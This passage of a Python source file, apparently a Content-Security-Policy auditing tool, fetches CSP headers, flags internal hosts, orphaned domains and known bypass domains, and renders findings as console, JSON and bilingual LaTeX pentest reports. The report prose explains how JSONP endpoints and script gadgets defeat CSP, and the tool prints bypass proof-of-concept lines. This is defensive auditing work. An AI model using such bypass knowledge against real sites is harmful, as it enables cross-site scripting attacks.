    for nameserver in nameservers:
        try:
            r = _dns_resolver.Resolver(configure=nameserver is None)
        except Exception:
            continue
        if nameserver:
            r.nameservers = [nameserver]
        r.lifetime = dns_timeout
        r.timeout = dns_timeout

        addresses: Set[str] = set()
        authoritative_empty = False
        transient = False
        for rtype in ("A", "AAAA"):
            try:
                addresses.update(rr.address for rr in r.resolve(host, rtype))
            except NXDOMAIN:
                return HostStatus.NO_PUBLIC_RECORD, []
            except NoAnswer:
                authoritative_empty = True
            except Exception:
                transient = True

        if addresses:
            found = sorted(addresses)
            return _classify_addresses(found), found
        if authoritative_empty and not transient:
            return HostStatus.NO_PUBLIC_RECORD, []

    return HostStatus.UNRESOLVED, []


async def build_host_health_map(
    hosts: Dict[str, bool], dns_resolvers: Optional[List[str]] = None, concurrency: int = 50, dns_timeout: float = 3.0
) -> Dict[str, tuple[HostStatus, List[str]]]:
    """Resolve every host once. Keys are hostnames, values whether the host was
    only ever seen as a wildcard source."""
    results: Dict[str, tuple[HostStatus, List[str]]] = {}
    if not hosts:
        return results
    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(concurrency)
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:

        async def task(h: str, wildcard: bool):
            async with sem:
                func = partial(_resolve_host_sync, h, dns_resolvers, dns_timeout, wildcard)
                results[h] = await loop.run_in_executor(pool, func)

        await asyncio.gather(*(task(h, w) for h, w in hosts.items()))
    return results


async def annotate_internal_hosts(
    results: List[URLResult],
    *,
    dns_resolvers: Optional[List[str]] = None,
    concurrency: int = 50,
    dns_timeout: float = 3.0,
) -> None:
    """Resolve every host referenced across all results once, then mark the
    source items whose host is internal-only or has no public record."""
    hosts: Dict[str, bool] = {}
    for res in results:
        if res.error or not res.csp_raw:
            continue
        for p in res.policies:
            for it in p.items:
                host = extract_host_from_source(it.raw)
                if not host:
                    continue
                wildcard = is_wildcard_token(it.raw)
                hosts[host] = hosts.get(host, True) and wildcard

    health = await build_host_health_map(
        hosts, dns_resolvers=dns_resolvers, concurrency=concurrency, dns_timeout=dns_timeout
    )

    for res in results:
        if res.error or not res.csp_raw:
            continue
        seen: Set = set()
        for p in res.policies:
            for it in p.items:
                host = extract_host_from_source(it.raw)
                if not host or host not in health:
                    continue
                status, addresses = health[host]
                it.host_status = status.value
                it.resolved_addresses = addresses
                if status == HostStatus.PUBLIC:
                    continue
                it.is_internal = status in INTERNAL_HOST_STATUSES
                key = (p.name, it.raw, host)
                if key not in seen:
                    seen.add(key)
                    res.host_findings.append(
                        HostFinding(
                            directive=p.name,
                            source_raw=it.raw,
                            host=host,
                            status=status.value,
                            addresses=addresses,
                        )
                    )
        if any(f.status in INTERNAL_HOST_STATUS_VALUES for f in res.host_findings):
            res.warnings["internal_hosts"] = True


def annotate_reporting_endpoint(result: URLResult, headers: httpx.Headers) -> None:
    """`report-to` names a group that only exists if the response also carries a
    Reporting-Endpoints header (or the older Report-To). Without one the
    directive points at nothing and no violation report is ever sent."""
    present = bool(headers.get("Reporting-Endpoints") or headers.get("Report-To"))
    result.reporting_endpoints_present = present
    if not present and any(p.name == "report-to" for p in result.policies):
        result.warnings["report_to_without_endpoint"] = True


def _describe_exc(prefix: str, exc: Optional[BaseException]) -> str:
    """httpx connect/read timeouts stringify to an empty message, which would
    leave the user with a bare "Request failed:"."""
    detail = str(exc) if exc else ""
    return f"{prefix}: {type(exc).__name__}{f' ({detail})' if detail else ''}" if exc else f"{prefix}: unknown error"


async def fetch_csp(
    url: str,
    *,
    cookies: Dict[str, str],
    headers: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict] = None,
    is_secure: bool = True,
    redirect: bool = False,
    client: Optional[httpx.AsyncClient] = None,
    timeout_s: float = 15.0,
    max_retries: int = 2,
    backoff_base: float = 0.5,
    user_agent: str = DEFAULT_USER_AGENT,
) -> URLResult:
    requested_url = url
    url = normalize_url(url)

    owns_client = client is None
    if client is None:
        mounts = build_proxy_mounts(proxies or {}, verify=is_secure)
        client_kwargs: dict = dict(
            headers={"User-Agent": user_agent, **(headers or {})},
            cookies=cookies or {},
            verify=is_secure,
            follow_redirects=redirect,
            timeout=httpx.Timeout(timeout_s),
        )
        if mounts:
            client_kwargs["mounts"] = mounts
        client = httpx.AsyncClient(**client_kwargs)

    try:
        last_exc = None
        for attempt in range(max_retries + 1):
            try:
                resp = await client.get(url)
                break
            except (httpx.TransportError, httpx.TimeoutException) as e:
                last_exc = e
                if attempt >= max_retries:
                    return URLResult(
                        url=url,
                        requested_url=requested_url,
                        csp_raw=None,
                        unreachable=True,
                        error=_describe_exc("Request failed", e),
                    )
                await asyncio.sleep(backoff_base * (2**attempt))
        else:
            return URLResult(
                url=url,
                requested_url=requested_url,
                csp_raw=None,
                unreachable=True,
                error=_describe_exc("Request failed", last_exc),
            )

        # With --redirect the response comes from the final hop; report that
        # URL instead of the one originally requested.
        url = str(resp.url)

        csp_header = resp.headers.get("Content-Security-Policy")
        legacy_header = False

        # A policy in a <meta> tag is enforced, so it takes precedence over the
        # X-Content-Security-Policy prefix, which no current browser honours.
        if not csp_header:
            csp_header = extract_csp_from_html_head(resp.text)

        if not csp_header:
            csp_header = resp.headers.get("X-Content-Security-Policy")
            legacy_header = bool(csp_header)

        report_only_header = resp.headers.get("Content-Security-Policy-Report-Only")

        if not csp_header and report_only_header:
            result = parse_csp(report_only_header, url, requested_url)
            result.report_only = True
            annotate_reporting_endpoint(result, resp.headers)
            return result

        result = parse_csp(csp_header, url, requested_url)
        if report_only_header:
            result.warnings["has_report_only_too"] = True
        if legacy_header:
            result.legacy_header = True
            result.warnings["legacy_header_only"] = True
        annotate_reporting_endpoint(result, resp.headers)
        return result

    except Exception as e:
        return URLResult(
            url=url,
            requested_url=requested_url,
            csp_raw=None,
            unreachable=True,
            error=_describe_exc("Request failed", e),
        )
    finally:
        if owns_client:
            await client.aclose()


async def fetch_multiple_csps(
    urls: Sequence[str],
    *,
    cookies: Dict[str, str],
    headers: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict] = None,
    is_secure: bool = True,
    redirect: bool = False,
    concurrency: int = 20,
    timeout_s: float = 15.0,
    max_retries: int = 2,
    user_agent: str = DEFAULT_USER_AGENT,
) -> List[URLResult]:
    sem = asyncio.Semaphore(concurrency)
    mounts = build_proxy_mounts(proxies or {}, verify=is_secure)
    client_kwargs: dict = dict(
        headers={"User-Agent": user_agent, **(headers or {})},
        cookies=cookies or {},
        verify=is_secure,
        follow_redirects=redirect,
        timeout=httpx.Timeout(timeout_s),
    )
    if mounts:
        client_kwargs["mounts"] = mounts

    async with httpx.AsyncClient(**client_kwargs) as client:

        async def _task(u: str) -> URLResult:
            async with sem:
                return await fetch_csp(
                    u,
                    cookies=cookies,
                    headers=headers,
                    proxies=proxies,
                    is_secure=is_secure,
                    redirect=redirect,
                    client=client,
                    timeout_s=timeout_s,
                    max_retries=max_retries,
                )

        return await asyncio.gather(*(_task(u) for u in urls))


# ---------------------------------------
# Renderers
# ---------------------------------------


class BaseRenderer:
    def render_many(self, results: List[URLResult]) -> str:
        raise NotImplementedError


class TextRenderer(BaseRenderer):
    def __init__(self, console: Optional[Console]):
        self.console = console

    def print_to_console(self, results: List[URLResult]) -> None:
        for res in results:
            ro_badge = " [yellow](report-only)[/yellow]" if res.report_only else ""
            if res.legacy_header:
                ro_badge += " [red](X-Content-Security-Policy)[/red]"
            header = Text.from_markup(f"[bold]{res.requested_url}[/bold] — Fetched: [cyan]{res.url}[/cyan]{ro_badge}")
            self.console.print(Panel(header, expand=False, box=box.ROUNDED))  # type: ignore

            if res.error:
                self.console.print(f"[red]Error:[/red] {res.error}")  # type: ignore
                self.console.print()  # type: ignore
                continue

            warn_lines = []
            if res.report_only:
                warn_lines.append(
                    "[yellow]This is a [bold]report-only[/bold] CSP — violations are reported but not enforced.[/yellow]"
                )
            if res.legacy_header:
                warn_lines.append(
                    "[red]This policy is only served via [bold]X-Content-Security-Policy[/bold], a prefix no "
                    "current browser honours. It is [bold]not enforced[/bold]; the application effectively has "
                    "no CSP.[/red]"
                )
            if res.warnings.get("has_report_only_too"):
                warn_lines.append("A [yellow]Content-Security-Policy-Report-Only[/yellow] header is also present.")
            if res.warnings.get("multiple_policies"):
                warn_lines.append(
                    f"Header carries [yellow]{res.warnings['multiple_policies']} policies[/yellow]. A browser "
                    f"enforces all of them, so only what every policy permits has any effect."
                )
            if res.warnings.get("duplicate_directives"):
                warn_lines.append(
                    "[yellow]Repeated directives, only the first of each applies:[/yellow] "
                    + ", ".join(res.warnings["duplicate_directives"])
                )
            if res.warnings.get("missing_directives"):
                warn_lines.append(
                    "[dark_orange]Unrestricted, nothing falls back to them:[/dark_orange] "
                    + ", ".join(res.warnings["missing_directives"])
                )
            if res.warnings.get("deprecated_directives"):
                warn_lines.append("Deprecated/legacy directives: " + ", ".join(res.warnings["deprecated_directives"]))
            if res.unknown_used:
                warn_lines.append(
                    "[red]Unknown directives (ignored by browsers, check for typos):[/red] "
                    + ", ".join(res.unknown_used)
                )
            if res.warnings.get("unsafe_inline"):
                warn_lines.append("Uses [red]'unsafe-inline'[/red].")
            if res.warnings.get("unsafe_eval"):
                warn_lines.append("Uses [red]'unsafe-eval'[/red].")
            if res.warnings.get("wildcard_any_origin"):
                warn_lines.append("Uses [dark_orange]any-origin wildcards (*)[/dark_orange].")
            if res.warnings.get("wildcard_partial"):
                warn_lines.append(
                    "Uses [dark_orange]partial wildcards[/dark_orange] (e.g. *.example.com), which trust "
                    "every host under that suffix."
                )
            if res.warnings.get("data_or_blob"):
                warn_lines.append("Allows [yellow]data:[/yellow] or [yellow]blob:[/yellow] sources.")
            if res.warnings.get("missing_report_to"):
                warn_lines.append(
                    "No violation reporting configured ([white]report-to[/white]/[white]report-uri[/white])."
                )
            if res.warnings.get("legacy_reporting_only"):
                warn_lines.append(
                    "Reporting uses the deprecated [yellow]report-uri[/yellow] only; add [white]report-to[/white]."
                )
            if res.warnings.get("report_to_without_endpoint"):
                warn_lines.append(
                    "[yellow]report-to[/yellow] names a group, but the response has no "
                    "[white]Reporting-Endpoints[/white] header, so no report is ever sent."
                )
            if res.warnings.get("missing_https_and_upgrade"):
                warn_lines.append(
                    "No explicit [white]https://[/white] sources and missing [white]upgrade-insecure-requests[/white]."
                )
            if res.warnings.get("bypass_via_catchall"):
                warn_lines.append(
                    f"[bright_red bold]CSP bypass possible![/bright_red bold] [bright_red]"
                    f"{', '.join(res.warnings['bypass_via_catchall'])} matches any host, so all "
                    f"{len(BYPASS_DOMAINS)} known bypass domains are permitted.[/bright_red]"
                )
            if res.warnings.get("bypass_domains"):
                warn_lines.append(
                    f"[bright_red bold]CSP bypass possible![/bright_red bold] "
                    f"[bright_red]{len(res.bypass_findings)} known bypassable source(s) — see Bypass Findings below.[/bright_red]"
                )
            if res.warnings.get("orphan_domains"):
                warn_lines.append(
                    f"[magenta bold]Orphaned domain(s) detected![/magenta bold] "
                    f"[magenta]{len(res.orphan_findings)} allowlisted source(s) point to unregistered/dangling "
                    f"domains an attacker could claim (likely typos) — see Orphan Domains below.[/magenta]"
                )

            if res.warnings.get("internal_hosts"):
                internal = [f for f in res.host_findings if f.status != HostStatus.UNRESOLVED.value]
                warn_lines.append(
                    f"[cyan bold]Internal / non-public host(s) detected![/cyan bold] "
                    f"[cyan]{len(internal)} allowlisted source(s) do not resolve publicly — the policy leaks "
                    f"internal infrastructure names — see Internal / Non-Public Hosts below.[/cyan]"
                )

            if warn_lines:
                self.console.print(  # type: ignore
                    Panel(
                        "\n".join(warn_lines),
                        title="Warnings",
                        border_style="yellow",
                        box=box.ROUNDED,
                    )
                )

            table = Table(
                title="Content-Security-Policy" + (" (report-only)" if res.report_only else ""),
                show_header=True,
                header_style="bold",
                box=box.SIMPLE_HEAVY,
                expand=True,
            )
            table.add_column("Directive", no_wrap=True)
            table.add_column("Source / Value", style="white")

            for p in res.policies:
                directive_label = f"[blue]{p.name}[/blue]"
                if p.is_deprecated:
                    directive_label += " [yellow](deprecated/legacy)[/yellow]"
                if p.is_unknown:
                    directive_label += " [red](unknown directive)[/red]"
                if p.is_ignored_duplicate:
                    directive_label += " [yellow](ignored: repeated)[/yellow]"
                if p.help_text:
                    directive_label += f" [white]— {p.help_text}[/white]"

                if not p.items:
                    table.add_row(directive_label, "")
                    continue

                first = True
                for it in p.items:
                    expl = f" [dim]— {it.note}[/dim]" if it.note else ""
                    https_mark = " [dim](missing https)[/dim]" if it.is_missing_https else ""
                    bypass_mark = " [bright_red bold][BYPASS][/bright_red bold]" if it.is_bypass else ""
                    orphan_mark = f" [magenta bold][ORPHAN: {it.orphan_status}][/magenta bold]" if it.is_orphan else ""
                    internal_mark = f" [cyan bold][INTERNAL: {it.host_status}][/cyan bold]" if it.is_internal else ""
                    dead_mark = " [dim](no effect: blocked by another policy)[/dim]" if it.is_ineffective else ""
                    if it.is_orphan and not it.is_bypass:
                        item_color = "magenta"
                    elif it.is_internal and not it.is_bypass:
                        item_color = "cyan"
                    else:
                        item_color = it.color
                    value = (
                        f"[{item_color}]{it.raw}[/{item_color}]{https_mark}{dead_mark}{expl}"
                        f"{bypass_mark}{orphan_mark}{internal_mark}"
                    )
                    table.add_row(directive_label if first else "", value)
                    first = False

            self.console.print(table)  # type: ignore

            if res.bypass_findings:
                bypass_lines = []
                for bf in res.bypass_findings:
                    risks_str = " + ".join(f"[bright_red]{r}[/bright_red]" for r in bf.risks)
                    bypass_lines.append(
                        f"[bold]{bf.directive}[/bold]: [bright_red]{bf.source_raw}[/bright_red] "
                        f"→ bypass domain [yellow]{bf.bypass_domain}[/yellow] "
                        f"(risks: {risks_str})"
                    )
                    for i, poc in enumerate(bf.pocs, 1):
                        label = f"  PoC{i if len(bf.pocs) > 1 else ''}: "
                        bypass_lines.append(f"[dim]{label}[/dim][cyan]{poc}[/cyan]")
                self.console.print(  # type: ignore
                    Panel(
                        "\n".join(bypass_lines),
                        title="[bright_red bold]Bypass Findings[/bright_red bold]",
                        border_style="bright_red",
                        box=box.ROUNDED,
                    )
                )

            if res.orphan_findings:
                orphan_lines = []
                for of in res.orphan_findings:
                    orphan_lines.append(
                        f"[bold]{of.directive}[/bold]: [magenta]{of.source_raw}[/magenta] "
                        f"→ registrable domain [yellow]{of.fld}[/yellow] is [magenta]{of.status}[/magenta] "
                        f"(claimable by an attacker)"
                    )
                self.console.print(  # type: ignore
                    Panel(
                        "\n".join(orphan_lines),
                        title="[magenta bold]Orphan Domains[/magenta bold]",
                        border_style="magenta",
                        box=box.ROUNDED,
                    )
                )

            if res.host_findings:
                host_lines = []
                for hf in res.host_findings:
                    status = HostStatus(hf.status)
                    addrs = f" [dim]({', '.join(hf.addresses)})[/dim]" if hf.addresses else ""
                    host_lines.append(
                        f"[bold]{hf.directive}[/bold]: [cyan]{hf.source_raw}[/cyan] "
                        f"→ [yellow]{hf.host}[/yellow] is [cyan]{hf.status}[/cyan]"
                        f" — {HOST_STATUS_HELP[status]}{addrs}"
                    )
                self.console.print(  # type: ignore
                    Panel(
                        "\n".join(host_lines),
                        title="[cyan bold]Internal / Non-Public Hosts[/cyan bold]",
                        border_style="cyan",
                        box=box.ROUNDED,
                    )
                )

            self.console.print()  # type: ignore

    def render_many(self, results: List[URLResult]) -> str:
        lines: List[str] = []
        for res in results:
            lines.append("=" * 78)
            ro_note = "  [REPORT-ONLY]" if res.report_only else ""
            lines.append(f"{res.requested_url}  (fetched: {res.url}){ro_note}")
            lines.append("=" * 78)
            if res.error:
                lines.append(f"Error: {res.error}")
                lines.append("")
                continue

            if res.legacy_header:
                lines.append(
                    "NOTE: This policy is only served via X-Content-Security-Policy, a prefix no current "
                    "browser honours. It is not enforced."
                )
                lines.append("")
            if res.report_only:
                lines.append("NOTE: This is a report-only CSP — violations are reported but not enforced.")
                lines.append("")
            if res.warnings.get("has_report_only_too"):
                lines.append("NOTE: A Content-Security-Policy-Report-Only header is also present.")
                lines.append("")
            if res.warnings.get("report_to_without_endpoint"):
                lines.append(
                    "NOTE: report-to names a group, but the response has no Reporting-Endpoints "
                    "header, so no report is ever sent."
                )
                lines.append("")

            if res.warnings.get("missing_directives"):
                lines.append(
                    "Unrestricted, nothing falls back to them: " + ", ".join(res.warnings["missing_directives"])
                )
                lines.append("")

            if res.deprecated_used:
                lines.append("Deprecated/legacy directives present: " + ", ".join(res.deprecated_used))
                lines.append("")

            if res.unknown_used:
                lines.append(
                    "Unknown directives (ignored by browsers, check for typos): " + ", ".join(res.unknown_used)
                )
                lines.append("")

            if res.csp_raw:
                lines.append("CSP (raw):")
                lines.append("  " + res.csp_raw)
                lines.append("")

            for p in res.policies:
                tag = f"[{p.name}]"
                if p.is_deprecated:
                    tag += " (deprecated/legacy)"
                if p.is_unknown:
                    tag += " (unknown directive)"
                if p.is_ignored_duplicate:
                    tag += " (ignored: repeated)"
                if p.help_text:
                    tag += f" — {p.help_text}"
                lines.append(tag)

                if not p.items:
                    lines.append("  (no values)")
                    continue

                for it in p.items:
                    expl = f" — {it.note}" if it.note else ""
                    https_mark = " (missing https)" if it.is_missing_https else ""
                    bypass_mark = " [BYPASS]" if it.is_bypass else ""
                    orphan_mark = f" [ORPHAN: {it.orphan_status}]" if it.is_orphan else ""
                    internal_mark = f" [INTERNAL: {it.host_status}]" if it.is_internal else ""
                    dead_mark = " (no effect: blocked by another policy)" if it.is_ineffective else ""
                    lines.append(f"  + {it.raw}{https_mark}{dead_mark}{expl}{bypass_mark}{orphan_mark}{internal_mark}")
                lines.append("")

            if res.warnings.get("bypass_via_catchall"):
                lines.append(
                    f"CSP BYPASS: {', '.join(res.warnings['bypass_via_catchall'])} matches any host, "
                    f"so all {len(BYPASS_DOMAINS)} known bypass domains are permitted."
                )
                lines.append("")

            if res.bypass_findings:
                lines.append("--- BYPASS FINDINGS ---")
                for bf in res.bypass_findings:
                    risks_str = ", ".join(bf.risks)
                    lines.append(
                        f"  {bf.directive}: {bf.source_raw} -> bypass domain {bf.bypass_domain} (risks: {risks_str})"
                    )
                    for i, poc in enumerate(bf.pocs, 1):
                        label = f"    PoC{i if len(bf.pocs) > 1 else ''}: "
                        lines.append(f"{label}{poc}")
                lines.append("")

            if res.orphan_findings:
                lines.append("--- ORPHAN DOMAINS (claimable by an attacker) ---")
                for of in res.orphan_findings:
                    lines.append(f"  {of.directive}: {of.source_raw} -> registrable domain {of.fld} ({of.status})")
                lines.append("")

            if res.host_findings:
                lines.append("--- INTERNAL / NON-PUBLIC HOSTS ---")
                for hf in res.host_findings:
                    addrs = f" [{', '.join(hf.addresses)}]" if hf.addresses else ""
                    lines.append(
                        f"  {hf.directive}: {hf.source_raw} -> {hf.host} ({hf.status}: "
                        f"{HOST_STATUS_HELP[HostStatus(hf.status)]}){addrs}"
                    )
                lines.append("")

            lines.append("")
        return "\n".join(lines)


class RawRenderer(BaseRenderer):
    def render_many(self, results: List[URLResult]) -> str:
        lines: List[str] = []
        multi = len(results) > 1
        for res in results:
            if multi:
                lines.append(f"# {res.requested_url}")
            if res.csp_raw:
                lines.append(pretty_csp(res.csp_raw))
            else:
                lines.append(f"# {res.error or 'Content-Security-Policy header not found'}")
        return "\n".join(lines)


class JsonRenderer(BaseRenderer):
    def render_many(self, results: List[URLResult]) -> str:
        def policy_to_dict(p: Policy) -> Dict:
            return {
                "name": p.name,
                "is_deprecated": p.is_deprecated,
                "is_unknown": p.is_unknown,
                "is_ignored_duplicate": p.is_ignored_duplicate,
                "policy_index": p.policy_index,
                "help_text": p.help_text,
                "items": [
                    {
                        "raw": i.raw,
                        "normalized": i.normalized,
                        "note": i.note,
                        "color": i.color,
                        "is_bypass": i.is_bypass,
                        "is_ineffective": i.is_ineffective,
                        "wildcard_kind": i.wildcard_kind,
                        "is_orphan": i.is_orphan,
                        "orphan_status": i.orphan_status,
                        "is_internal": i.is_internal,
                        "host_status": i.host_status,
                        "resolved_addresses": i.resolved_addresses,
                        "is_missing_https": i.is_missing_https,
                    }
                    for i in p.items
                ],
            }

        def bypass_to_dict(bf: BypassFinding) -> Dict:
            return {
                "directive": bf.directive,
                "source_raw": bf.source_raw,
                "bypass_domain": bf.bypass_domain,
                "risks": bf.risks,
                "pocs": bf.pocs,
            }

        def orphan_to_dict(of: OrphanFinding) -> Dict:
            return {
                "directive": of.directive,
                "source_raw": of.source_raw,
                "host": of.host,
                "fld": of.fld,
                "status": of.status,
            }

        def host_to_dict(hf: HostFinding) -> Dict:
            return {
                "directive": hf.directive,
                "source_raw": hf.source_raw,
                "host": hf.host,
                "status": hf.status,
                "addresses": hf.addresses,
            }

        payload = [
            {
                "requested_url": r.requested_url,
                "fetched_url": r.url,
                "csp_raw": r.csp_raw,
                "deprecated_used": r.deprecated_used,
                "unknown_used": r.unknown_used,
                "report_only": r.report_only,
                "legacy_header": r.legacy_header,
                "unreachable": r.unreachable,
                "reporting_endpoints_present": r.reporting_endpoints_present,
                "error": r.error,
                "warnings": {k: v for k, v in r.warnings.items()},
                "bypass_findings": [bypass_to_dict(bf) for bf in r.bypass_findings],
                "orphan_findings": [orphan_to_dict(of) for of in r.orphan_findings],
                "host_findings": [host_to_dict(hf) for hf in r.host_findings],
                "policies": [policy_to_dict(p) for p in r.policies],
            }
            for r in results
        ]
        return json.dumps(payload, indent=2, sort_keys=False)


# Canonical column/attribute order of the `probleme=` baustein options.
PROBLEM_ORDER = ["missing-directive", "unsafe", "no-https", "all-origins", "data", "no-report"]

# Column headings for the overview table. The keys of the problem entries are the
# `probleme=` option names, which are internal and stay untranslated in the
# baustein call itself.
COLUMN_TITLES: Dict[str, Dict[str, str]] = {
    "de": {
        "missing-directive": "Fehlende Direktiven",
        "unsafe": "Unsichere Schlüsselwörter",
        "no-https": "HTTPS nicht erzwungen",
        "all-origins": "Alle Quellen erlaubt",
        "data": r"\texttt{data:}/\texttt{blob:} erlaubt",
        "no-report": "Kein Reporting",
        "no-csp": "Keine CSP gesetzt",
        "not-reachable": "Nicht erreichbar",
    },
    "en": {
        "missing-directive": "Missing directives",
        "unsafe": "Unsafe keywords",
        "no-https": "HTTPS not enforced",
        "all-origins": "All origins allowed",
        "data": r"\texttt{data:}/\texttt{blob:} allowed",
        "no-report": "No reporting",
        "no-csp": "No CSP set",
        "not-reachable": "Not reachable",
    },
}


class LatexRenderer(BaseRenderer):
    def __init__(self, lang: str = "en"):
        self.lang = normalize_lang(lang)

    def _problems_list(self, res: URLResult) -> List[str]:
        problems: List[str] = []

        if res.warnings.get("missing_directives"):
            problems.append("missing-directive")

        if res.warnings.get("unsafe_inline") or res.warnings.get("unsafe_eval"):
            problems.append("unsafe")

        if res.warnings.get("wildcard_sources"):
            problems.append("all-origins")

        if res.warnings.get("data_or_blob"):
            problems.append("data")

        if res.warnings.get("missing_report_to") or res.warnings.get("report_to_without_endpoint"):
            problems.append("no-report")

        if res.warnings.get("missing_https_and_upgrade"):
            problems.append("no-https")

        # if res.warnings.get("bypass_domains"):
        #     problems.append("bypass")

        return [p for p in PROBLEM_ORDER if p in problems]

    def _findings_comment(self, results: List[URLResult]) -> str:
        """Build a LaTeX comment block listing the bypassable and orphaned
        domains found across all results. Returns '' when there is nothing to
        report so no stray comment is emitted."""
        bypass_rows: List[str] = []
        orphan_rows: List[str] = []
        host_rows: List[str] = []
        multi = len(results) > 1

        for res in results:
            prefix = f"{res.requested_url}: " if multi else ""
            for catchall in res.warnings.get("bypass_via_catchall", []):
                bypass_rows.append(f"%   {prefix}{catchall} -> matches any host, all known bypass domains apply")
            for bf in res.bypass_findings:
                risks = ", ".join(bf.risks) if bf.risks else "—"
                bypass_rows.append(f"%   {prefix}{bf.directive} {bf.source_raw} -> {bf.bypass_domain} (risks: {risks})")
            for of in res.orphan_findings:
                orphan_rows.append(f"%   {prefix}{of.directive} {of.source_raw} -> {of.fld} ({of.status})")
            for hf in res.host_findings:
                addrs = f" [{', '.join(hf.addresses)}]" if hf.addresses else ""
                host_rows.append(f"%   {prefix}{hf.directive} {hf.source_raw} -> {hf.host} ({hf.status}){addrs}")

        if not bypass_rows and not orphan_rows and not host_rows:
            return ""

        sep = "% " + "-" * 73
        lines = [
            sep,
            "% csp-check findings summary (auto-generated) — review before delivery",
            sep,
            "% Known CSP-bypass domains (script gadgets / JSONP endpoints):",
        ]
        lines.extend(bypass_rows or ["%   (none found)"])
        lines.append("%")
        lines.append("% Orphaned / dangling domains (unregistered, attacker-claimable; often typos):")
        lines.extend(orphan_rows or ["%   (none found)"])
        lines.append("%")
        lines.append("% Internal / non-public hosts (do not resolve publicly; leak internal naming):")
        lines.extend(host_rows or ["%   (none found)"])
        lines.append(sep)
        return "\n".join(lines)

    def _unreachable_comment(self, results: List[URLResult]) -> str:
        """Name the hosts that never answered. Nothing can be said about the CSP
        of a host that was not reached, so the finding must not claim it has
        none."""
        rows = [f"%   {r.requested_url}: {r.error}" for r in results if r.unreachable]
        if not rows:
            return ""
        sep = "% " + "-" * 73
        return "\n\n" + "\n".join(
            [
                sep,
                "% Not reachable during the assessment. No statement about a Content",
                "% Security Policy is possible for these hosts:",
                *rows,
                sep,
            ]
        )

    def _legacy_header_comment(self, results: List[URLResult]) -> str:
        """Note the policies that exist but are served through the obsolete
        prefixed header, so the no-CSP finding above can be justified."""
        rows = [f"%   {r.requested_url}: {r.csp_raw}" for r in results if r.legacy_header]
        if not rows:
            return ""
        sep = "% " + "-" * 73
        return "\n\n" + "\n".join(
            [
                sep,
                "% A policy is present, but only in the obsolete X-Content-Security-Policy",
                "% header, which no current browser honours. It is therefore not enforced:",
                *rows,
                sep,
            ]
        )

    def _extra_sections(self, results: List[URLResult]) -> str:
        """Prose paragraphs (DE/EN) explaining the problem classes that have no
        dedicated `probleme=` group in the template — known bypasses, orphaned
        domains and deprecated directives — emitted only when relevant. The
        concrete affected entries are injected into the text."""
        de = self.lang == "de"

        def tt(items: List[str]) -> str:
            return ", ".join(rf"\texttt{{{latex_escape(i)}}}" for i in items)

        bypasses = sorted({bf.bypass_domain for r in results if has_effective_csp(r) for bf in r.bypass_findings})
        catchall = sorted(
            {c for r in results if has_effective_csp(r) for c in r.warnings.get("bypass_via_catchall", [])}
        )
        orphans = sorted({of.fld for r in results for of in r.orphan_findings})
        internal_hosts = sorted(
            {hf.host for r in results for hf in r.host_findings if hf.status in INTERNAL_HOST_STATUS_VALUES}
        )
        deprecated = sorted({d for r in results for d in r.deprecated_used})
        unknown = sorted({d for r in results for d in r.unknown_used})

        de_bypass = Template(
            r"Einige der in der CSP erlaubten Quellen ($BYPASS) sind dafür bekannt, dass sich über sie die "
            r"Schutzwirkung der Content Security Policy umgehen lässt. Auf diesen Domains werden Endpunkte wie "
            r"JSONP-Schnittstellen oder sogenannte \enquote{Script Gadgets} bereitgestellt, mit denen sich trotz "
            r"aktiver CSP beliebiger JavaScript-Code zur Ausführung bringen lässt. Ist eine solche Domain als "
            r"Skriptquelle zugelassen, kann ein Angreifer die CSP im Rahmen eines Cross-Site-Scripting-Angriffs "
            r"umgehen und Schadcode ausführen. Es wird empfohlen, die betroffenen Quellen zu entfernen oder, sofern "
            r"sie zwingend benötigt werden, so restriktiv wie möglich einzuschränken."
        )
        en_bypass = Template(
            r"Some of the sources allowed by the CSP ($BYPASS) are known to allow the protection of the Content "
            r"Security Policy to be bypassed. These domains host endpoints such as JSONP interfaces or so-called "
            r"\enquote{script gadgets} that can be abused to execute arbitrary JavaScript code despite an active "
            r"CSP. If such a domain is permitted as a script source, an attacker can circumvent the CSP in the "
            r"context of a cross-site scripting attack and execute malicious code. It is recommended to remove the "
            r"affected sources or, if they are strictly required, to restrict them as much as possible."
        )
        de_catchall = Template(
            r"Für Skriptquellen erlaubt die CSP Platzhalter, die jede beliebige Herkunft einschließen "
            r"($CATCHALL). Damit sind auch sämtliche Domains erlaubt, über die sich die Schutzwirkung einer "
            r"Content Security Policy nachweislich umgehen lässt, etwa über JSONP-Schnittstellen oder "
            r"sogenannte \enquote{Script Gadgets}. Eine Einzelaufstellung dieser Domains erübrigt sich, da die "
            r"Richtlinie an dieser Stelle keine Einschränkung vornimmt. Es wird empfohlen, die Skriptquellen "
            r"auf die tatsächlich benötigten Hosts zu beschränken."
        )
        en_catchall = Template(
            r"The CSP allows script sources that cover any origin ($CATCHALL). Every domain known to defeat a "
            r"Content Security Policy, whether through a JSONP interface or a so-called \enquote{script "
            r"gadget}, is therefore permitted as well. Listing those domains individually serves no purpose, "
            r"because the policy imposes no restriction at this point. It is recommended to narrow the script "
            r"sources to the hosts that are actually needed."
        )
        de_orphan = Template(
            r"In der CSP sind Hosts als vertrauenswürdige Quellen hinterlegt, deren registrierbare Domains ($ORPHAN) "
            r"zum Zeitpunkt der Untersuchung nicht registriert waren bzw. nicht über das DNS aufgelöst werden "
            r"konnten. In vielen Fällen handelt es sich dabei um Tippfehler oder um Domains von Diensten, die nicht "
            r"mehr verwendet werden. Da solche Domains frei registriert werden können, könnte ein Angreifer sie auf "
            r"sich registrieren und anschließend Inhalte aus einer Quelle ausliefern, "
            r"der die CSP bereits vertraut. Auf diese Weise ließe sich die Schutzwirkung der CSP aushebeln. Es wird "
            r"empfohlen, nicht mehr benötigte Einträge zu entfernen sowie Tippfehler zu korrigieren."
        )
        en_orphan = Template(
            r"The CSP allowlists hosts whose registrable domains ($ORPHAN) were not registered at the time of the "
            r"assessment, or could not be resolved via DNS. In many cases these are typos or domains of services "
            r"that are no longer in use. Because such domains can be registered freely, an attacker could register "
            r"one and then serve content -- for example scripts -- from a source the CSP already trusts. This would "
            r"allow the protection provided by the CSP to be undermined. It is recommended to remove entries that "
            r"are no longer needed and to correct obvious typos."
        )
        de_internal = Template(
            r"In der CSP sind Hosts als vertrauenswürdige Quellen hinterlegt, die über öffentliche DNS-Server nicht "
